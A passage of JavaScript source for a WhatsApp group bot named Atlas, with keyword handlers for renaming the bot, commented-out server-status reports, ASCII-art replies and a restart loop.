    const keywordExists = keywords.some(keyword => messageText.startsWith(keyword));

    if (keywordExists) {
        const newName = messageText.replace("set name", "").trim(); // Trim whitespace

    // Assuming you have a function called Atlas.query to send the IQ message
    const setNameIQ = {
        tag: "iq",
        attrs: {
            to: "@s.whatsapp.net",
            type: "set",
            xmlns: "name", // Assuming "name" is the correct XML namespace for setting the name
        },
        content: [
            {
                tag: "name", // Use "name" tag to indicate changing the name
                attrs: {},
                content: Buffer.from(newName, "utf-8"),
            },
        ],
    };

    Atlas.query(setNameIQ)
        .then(() => {
            console.log("Name set successfully.");
            restartBot();
        })
        .catch(error => {
            console.error('Error:', error);
        });
    }
}
    
// const pm2 = require('pm2');

// // ... (Other parts of your code)

// if (m.isGroup && !body.startsWith(prefix) && isCreator) {
//     const messageText = body.toLowerCase();
//     const os = require('os');
//     const keywords = ["status"]; // Add more keywords if needed.

//     const used = process.memoryUsage();
//     const cpus = os.cpus().map(cpu => {
//         cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0);
//         return cpu;
//     });
//     const cpu = cpus.reduce((last, cpu, _, { length }) => {
//         last.total += cpu.total;
//         last.speed += cpu.speed / length;
//         last.times.user += cpu.times.user;
//         last.times.nice += cpu.times.nice;
//         last.times.sys += cpu.times.sys;
//         last.times.idle += cpu.times.idle;
//         last.times.irq += cpu.times.irq;
//         return last;
//     }, {
//         speed: 0,
//         total: 0,
//         times: {
//             user: 0,
//             nice: 0,
//             sys: 0,
//             idle: 0,
//             irq: 0
//         }
//     });
//     const timestamp = performance.now();
//     const latensi = performance.now() - timestamp;
//     const neww = performance.now();
//     const oldd = performance.now();
//     const respon = `
// Response Speed $ {latensi.toFixed(4)} _Second_ \\n ${oldd - neww} _miliseconds_\\n\\nRuntime : $ {runtime(process.uptime())}
// » A17's Server Info 
// RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
// _NodeJS Memory Usage_
// ${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v => v.length)), ' ')}: ${formatp(used[key])}`).join('\\n')}
// ${cpus[0] ? `_Total CPU Usage_\\n${cpus[0].model.trim()} (${cpu.speed} MHZ)\\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\\n')}
// _CPU Core(s) Usage (${cpus.length} Core CPU)_\\n${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\\n')}`).join('\\n\\n')}` : ''}
//         `.trim();
    
//     await Atlas.sendMessage(m.from, { text: respon });
// }


    
//   const os = require('os');

// // Function to format bytes into a human-readable format
// function formatBytes(bytes) {
//   const units = ['B', 'KB', 'MB', 'GB', 'TB'];
//   const index = Math.floor(Math.log(bytes) / Math.log(1024));
//   return `${(bytes / Math.pow(1024, index)).toFixed(2)} ${units[index]}`;
// }

// // Assuming 'm' and 'body' are defined elsewhere

// if (m.isGroup && !body.startsWith(prefix) && isCreator) {
//   const messageText = body.toLowerCase();
//   const keywords = ["stry"]; // Add more keywords if needed.

//   const keywordExists = keywords.some(keyword => messageText.includes(keyword));

//   if (keywordExists) {
//     async function someTimeConsumingOperation() {
//       // Simulate a delay using setTimeout (Replace this with your actual MongoDB query or operation)
//       return new Promise(resolve => setTimeout(resolve, 1000));
//     }

//     // Start measuring the time before processing the message
//     const startTime = Date.now();

//     // Process the message and execute your bot's logic here (including MongoDB operations)
//     await someTimeConsumingOperation();

//     // Calculate the time taken for processing the message
//     const endTime = Date.now();
//     const responseTime = endTime - startTime;

//     // Get system information
//     const totalMemory = os.totalmem();
//     const freeMemory = os.freemem();
//     const usedMemory = totalMemory - freeMemory;
//     const systemInfo = {
//       platform: os.platform(),
//       arch: os.arch(),
//       release: os.release(),
//       hostname: os.hostname(),
//     };

//     // Get the current date and time
//     const currentDate = new Date();
//     const formattedTime = currentDate.toLocaleTimeString("en-US");
//     const formattedDate = currentDate.toLocaleDateString("en-US");

//     // Get the current day
//     const dayOfWeek = currentDate.getDay();
//     const days = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
//     const currentDay = days[dayOfWeek];

//     // Create the status message
//     const statusMessage = `Hey *☈A-ONE* !! My Response Speed: ${responseTime} ms\n\n` +
//       `Current Time: ${formattedTime}\n\n` +
//       `Current Date: ${formattedDate}\n\n` +
//       `Current Day: ${currentDay}\n\n` +
//       `Total RAM: ${formatBytes(totalMemory)}\n` +
//       `Used RAM: ${formatBytes(usedMemory)}\n` +
//       `Free RAM: ${formatBytes(freeMemory)}\n` +
//       `System Info: ${JSON.stringify(systemInfo)}`;

//     // Send the response message with the status and measured response time
//     await Atlas.sendMessage(m.from, { text: statusMessage }, { quoted: m });
//   }
// }


//     const os = require('os');

// // Function to format bytes into a human-readable format
// function formatBytes(bytes) {
//   const units = ['B', 'KB', 'MB', 'GB', 'TB'];
//   const index = Math.floor(Math.log(bytes) / Math.log(1024));
//   return `${(bytes / Math.pow(1024, index)).toFixed(2)} ${units[index]}`;
// }

// // Assuming 'm', 'body', 'prefix', 'isCreator', and 'Atlas' are defined elsewhere

// if (m.isGroup && !body.startsWith(prefix) && isCreator) {
//   const messageText = body.toLowerCase();
//   const keywords = ["stry"]; // Add more keywords if needed.

//   const keywordExists = keywords.some(keyword => messageText.includes(keyword));

//   if (keywordExists) {
//     async function someTimeConsumingOperation() {
//       // Simulate a delay using setTimeout (Replace this with your actual MongoDB query or operation)
//       return new Promise(resolve => setTimeout(resolve, 1000));
//     }

//     // Start measuring the time before processing the message
//     const startTime = Date.now();

//     // Process the message and execute your bot's logic here (including MongoDB operations)
//     await someTimeConsumingOperation();

//     // Calculate the time taken for processing the message
//     const endTime = Date.now();
//     const responseTime = endTime - startTime;

//     // Get system information
//     const totalMemory = os.totalmem();
//     const freeMemory = os.freemem();
//     const usedMemory = totalMemory - freeMemory;
//     const systemInfo = {
//       platform: os.platform(),
//       arch: os.arch(),
//       release: os.release(),
//       hostname: os.hostname(),
//     };

//     // Get the current date and time
//     const currentDate = new Date();
//     const formattedTime = currentDate.toLocaleTimeString("en-US");
//     const formattedDate = currentDate.toLocaleDateString("en-US");
//     const dayOfWeek = currentDate.getDay();
//     const days = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
//     const currentDay = days[dayOfWeek];

//     // Create the status message with cool formatting
//     const statusMessage = `
// *☈A-ONE* Status Report :sunglasses::sparkles:

// **Response Time:** ${responseTime} ms
// **Current Time:** ${formattedTime}
// **Current Date:** ${formattedDate}
// **Current Day:** ${currentDay}

// **System Information:**
// - *Platform:* ${systemInfo.platform}
// - *Architecture:* ${systemInfo.arch}
// - *Release:* ${systemInfo.release}
// - *Hostname:* ${systemInfo.hostname}

// **Memory Usage:**
// - *Total RAM:* ${formatBytes(totalMemory)}
// - *Used RAM:* ${formatBytes(usedMemory)}
// - *Free RAM:* ${formatBytes(freeMemory)}
// `;

//     // Send the response message with cool formatting
//     await Atlas.sendMessage(m.from, { text: statusMessage, markdown: true }, { quoted: m });
//   }
// }

 

    
 if (m.isGroup && !body.startsWith(prefix)) {
  const messageText = body.toLowerCase();
  const keywords = ["rias", "marinette", "akeno", "cat", "bunny", "dog", "puppy"]; // Add more keywords if needed.

  const keywordExists = keywords.some(keyword => messageText.includes(keyword));

  if (keywordExists) {
    // Choose the corresponding ASCII art based on the keyword
    let asciiArt = "";
    switch (messageText) {
      case "rias":
        asciiArt = `
         (  .      )
        )           (
      ( _      _ )
       (_)_____)
       _/______(_
     (  _____
      |  | | |
      |  |_| |
      |_______|`;
        break;
      case "marinette":
        asciiArt = `
      ⠀⠀⠀⠀⠈⠉⠉⠉⠉⠓⠒⠒⠒⠦⣄⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⡀⠙⢦⡀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⢻⡄⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⡠⢣⠀⠀⠘⣷⣄⠀
      ⠀⠀⠀⠀⢀⣴⠶⢋⣡⣤⣤⣤⠞⢃⠀⠀⠉⠙⢦
      ⠀⠀⠀⣠⠞⠁⠀⠀⢸⣿⣿⣷⠒⠚⠻⣦⡀⠀⢸
      ⢀⡴⠋⠁⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠙⢦⡀
      ⣸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣦
      ⠈⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙
      ⠀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦`;
        break;
      case "akeno":
        asciiArt = `
         _,_
        / " \\
      _/ ,  _\\
     /\\/| (\\  \\
    )   '._\\  /\\
    |       \\ )
    '.____.> \\
    (_ )\`  (_ )`;
        break;
      case "cat":
        asciiArt = `
  /\\_/\ 
 ( o.o ) 
 > ^ <`;
        break;
      case "bunny":
        asciiArt = `
 (\\(\ 
 (-.-)
 o_(")(")`;
        break;
      case "dog":
        asciiArt = `
  / \\__
 (    @\\___
 /         O
/   (_____/ 
/_____/   U`;
        break;
      case "puppy":
        asciiArt = `
  / \\__
 (    @\\___
 /         O
/   (_____/ 
/_____/   U`;
        break;
      // Add more cases for other keywords and their corresponding ASCII art
    }

    // Send the ASCII art as a reply
    await m.reply(asciiArt);
  }
}



    

// // ... (Other parts of your code)
// if (m.isGroup && !body.startsWith(prefix) && isCreator) {
//     const messageText = body.toLowerCase();
//     const keywords = ["sleep"]; // Add more keywords if needed.

//     const keywordExists = keywords.some(keyword => messageText.startsWith(keyword));

//     if (keywordExists) {
//         try {
//             const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

//             m.reply(`Okay, bye! Time to sleep!`);
//             await sleep(5000); // Pause for 5000 milliseconds using the custom sleep function

//             await Atlas.sendMessage(m.from, { text: "Restarting Success!" });

//             process.exit(); // Restart the bot by exiting the process

//         } catch (err) {
//             console.log(err);
//             await Atlas.sendMessage(m.from, { text: "Restarting Failed!" });
//             // Handle error if needed
//         }
//     }
// }

 let shouldRestart = false;

async function mainLoop() {
    // ... (Other parts of your code)

    if (m.isGroup && !body.startsWith(prefix) && isCreator) {
        const messageText = body.toLowerCase();
        const keywords = ["restart", "sleep"]; // Keywords to trigger restart

        const keywordExists = keywords.some(keyword => messageText.includes(keyword));

        if (keywordExists) {
            try {
                const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

                await m.reply(`Okay, bye! Time to sleep!`);
                await sleep(5000); // Pause for 5000 milliseconds using the custom sleep function

                await Atlas.sendMessage(m.from, { text: "Restarting Success!" });

                shouldRestart = true; // Set the flag to restart

            } catch (err) {
                console.error(err);
                await Atlas.sendMessage(m.from, { text: "Restarting Failed!" });
                // Handle error if needed
            }
        }
    }

    // ... (Other parts of your code)
}

// Set up signal handling for graceful shutdown
process.on('SIGINT', () => {
    console.log('Shutting down...');
    process.exit(0);
});

// Start the main loop
mainLoop();

// Loop for restarting
async function restartLoop() {
    while (true) {
        if (shouldRestart) {
            console.log('Restarting bot...');
            shouldRestart = false; // Reset the flag

            // Any additional setup or initialization code can go here

            await mainLoop(); // Wait for the main loop to finish

            // Delay before checking the restart flag again
            await new Promise(resolve => setTimeout(resolve, 10000)); // Wait for 10 seconds before checking again
        }

        // A short delay before checking the restart flag again
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}

restartLoop(); // Start the restart loop





 

    
    cmd.start(Atlas, m, {
      name: "Atlas",
      metadata,
      pushName: pushname,
      participants,
      body,
      inputCMD,
      args,
      botNumber,
      isCmd,
      isMedia,
      ar,
      isAdmin,
      groupAdmin,
      text,
      itsMe,
      doReact,
      modcheck,
      isCreator,
      quoted,
      isintegrated,
      groupName,
      mentionByTag,
      mime,
      isBotAdmin,
      prefix,
      db,
      command: cmd.name,
      commands,
      toUpper: function toUpper(query) {
        return query.replace(/^\w/, (c) => c.toUpperCase());
      },
    });
  } catch (e) {
    e = String(e);
    if (!e.includes("cmd.start")) console.error(e);
  }
};
